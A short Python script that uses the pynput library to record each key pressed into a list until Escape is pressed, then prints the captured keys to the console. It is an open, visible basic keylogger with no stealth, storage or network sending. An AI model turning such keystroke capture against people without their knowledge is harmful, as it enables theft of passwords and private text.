from pynput import keyboard

keystrokes = []

def on_press(key):
    
    try:
        keystrokes.append(str(key.char))
    
    except AttributeError:
        
        keystrokes.append(str(key))
        
def on_release(key):
    if key == keyboard.Key.esc:
        
        return False
with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

print("Captured Keystrokes. ", keystrokes)